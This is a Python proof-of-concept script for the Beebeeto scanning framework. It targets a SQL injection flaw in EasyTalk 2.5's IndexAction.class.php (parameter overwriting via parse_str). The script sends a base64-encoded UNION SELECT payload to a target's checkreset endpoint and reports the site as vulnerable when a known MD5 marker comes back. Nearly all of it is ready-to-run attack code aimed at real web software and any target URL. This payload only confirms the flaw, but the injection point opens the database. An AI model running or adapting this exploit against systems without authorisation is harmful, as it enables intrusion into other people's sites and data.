#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0081',
            'name': 'EasyTalk 2.5 /Home/Lib/Action/IndexAction.class.php SQL注入漏洞 POC',
            'author': 'foundu',
            'create_date': '2014-10-18',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'EasyTalk',
            'vul_version': ['2.5'],
            'type': 'SQL Injection',
            'tag': ['EasyTalk漏洞', 'SQL注入漏洞', 'IndexAction.class.php'],
            'desc': '/Home/Lib/Action/IndexAction.class.php参数urldata可以通过parse_str覆盖其他变量，导致SQL注入漏洞。',
            'references': ['http://wooyun.org/bugs/wooyun-2014-051788',
            ],
        },
    }


    @classmethod
    def verify(cls, args):
        verify_url = args['options']['target'] + '/?m=index&a=checkreset'
        payload = ("urldata=YWFhYWFhYWEmdXNlcl9uYW1lPXl1XCZtYWlsYWRyZXM9VU5JT04vKiovU0VMRUNULyoqLzEsMixtZDUo"
                   "MTIzMzIxKSw0LDUsNiw3LDgsOSwxMCwxMSwxMiwxMywxNCwxNSwxNiwxNywxOCwxOSwyMCwyMSwyMiwyMywyNCwy"
                   "NSwyNiwyNywyOCwyOSwzMCwzMSwzMiwzMywzNCwzNSwzNiwzNywzOCwzOSw0MCw0MSM=")
        req = urllib2.Request(verify_url, payload)
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
            print '[*] POST Data: ' + payload
        content = urllib2.urlopen(req).read()
        if 'c8837b23ff8aaa8a2dde915473ce0991' in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
            args['poc_ret']['post_content'] = payload
            return args
        args['success'] = False
        return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())